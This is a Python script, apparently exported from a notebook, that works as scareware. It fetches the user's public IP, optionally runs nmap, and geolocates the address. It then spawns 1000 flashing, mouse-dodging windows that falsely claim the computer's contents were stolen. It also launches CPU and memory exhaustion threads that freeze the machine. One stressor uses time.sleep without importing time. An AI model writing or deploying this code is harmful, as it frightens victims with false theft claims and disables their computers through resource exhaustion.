#!/usr/bin/env python
# coding: utf-8

# In[1]:


import subprocess
import os
import tkinter as tk
from tkinter import scrolledtext
import threading
import random
import pyautogui
import re
import requests

def process_nslookup_output(output):
    ip_addresses = re.findall(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', output)
    if len(ip_addresses) > 1:
        return ip_addresses[1]
    ip_addresses = re.findall(r'\b([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){7})\b', output)
    if len(ip_addresses) > 0:
        return ip_addresses[0][0]
    return "IP not found"

def run_command(cmd):
    try:
        result = subprocess.check_output(["cmd", "/c", cmd], stderr=subprocess.STDOUT, universal_newlines=True)
        return result
    except subprocess.CalledProcessError as e:
        return e.output  # If the command has a non-zero exit, return its output anyway.

def get_best_move(x, y, width, height, screen_width, screen_height):
    # Check all four directions and pick the one that maximizes the distance
    distances = [
        (x, 0),  # top
        (0, y),  # left
        (screen_width - width, y),  # right
        (x, screen_height - height)  # bottom
    ]
    return max(distances, key=lambda pos: ((pos[0] - x) ** 2 + (pos[1] - y) ** 2) ** 0.5)

def show_dialog(title, text):
    root = tk.Tk()
    root.title(title)
    root.geometry("650x400")
    root.attributes('-topmost', True)
    root.configure(bg='red') 

    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

    TITLE_BAR_HEIGHT = 30  # An estimated value; you may need to adjust this

    def move_away():
        x, y = pyautogui.position()  # Get mouse cursor position
        window_x = root.winfo_x()
        window_y = root.winfo_y() - TITLE_BAR_HEIGHT
        
        window_width = root.winfo_width()
        window_height = root.winfo_height()

    # If mouse is inside window bounds, including the title bar, move window
        if window_x < x < window_x + window_width and window_y < y < window_y + window_height + TITLE_BAR_HEIGHT:
            new_x, new_y = get_best_move(x, y, window_width, window_height, screen_width, screen_height)
            root.geometry(f"+{new_x}+{new_y}")
        root.after(1, move_away)

    move_away()  # Start the move_away function

    text_widget = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=70, height=20, bg='red', fg='white')
    text_widget.insert(tk.END, text)
    text_widget.grid(column=0, row=0, sticky="W")
    text_widget.config(state=tk.DISABLED)
    
    def alternate_color():
        current_color = root.cget("bg")
        new_color = "black" if current_color == "red" else "red"
        root.configure(bg=new_color)
        text_widget.configure(bg=new_color)
        root.after(100, alternate_color)

    alternate_color()

    root.mainloop()
    
def cpu_stressor():
    while True:
        for _ in range(10000):
            3.14 * 3.14

def memory_stressor():
    lst = []
    while True:
        for _ in range(10000):
            lst.append("HAHA")
        time.sleep(1)
        
def get_geolocation(ip_address):
    try:
        response = requests.get(f"http://ipinfo.io/{ip_address}/json")
        data = response.json()
        city = data.get("city", "N/A")
        region = data.get("region", "N/A")
        country = data.get("country", "N/A")
        loc = data.get("loc", "N/A")  # Latitude and Longitude
        location = f"{city},\n{region},\n{country},\nCoordinates: {loc}"
        return location
    except Exception as e:
        return "Unknown location"

if __name__ == "__main__":
    log_file = "output_log.txt"
    
    command_to_run1 = "nslookup myip.opendns.com resolver1.opendns.com"
    raw_output1 = run_command(command_to_run1)
    raw_output2 = "nothing"
    
    current_directory = os.getcwd()
    nmap_path = os.path.join(current_directory, ".\\Nmap\\nmap.exe")
    if os.path.exists(nmap_path):
        command_to_run2 = f"{nmap_path} scanme.nmap.org"
        raw_output2 = run_command(command_to_run2)
    
    with open(log_file, "w") as file:
        file.write("1:\n")
        file.write(raw_output1)
        file.write("\n2:\n")
        file.write(raw_output2)
        
    ip_address = process_nslookup_output(raw_output1)
    location = get_geolocation(ip_address)
    
    output_phrase = f"hello you dumb idiot you are exposed\nwe scanned your ports\nand already have stolen everything you\nhave on your computer haha,\nthis is your public IP:\n{ip_address}\nLocation: {location}\n "
    
    for _ in range(1000):
        t = threading.Thread(target=show_dialog, args=("WARNING HAHAHAHAHA", output_phrase))
        t.start()
        
    for _ in range(10):#CPU kill haha
        threading.Thread(target=cpu_stressor).start()
        
    threading.Thread(target=memory_stressor).start()

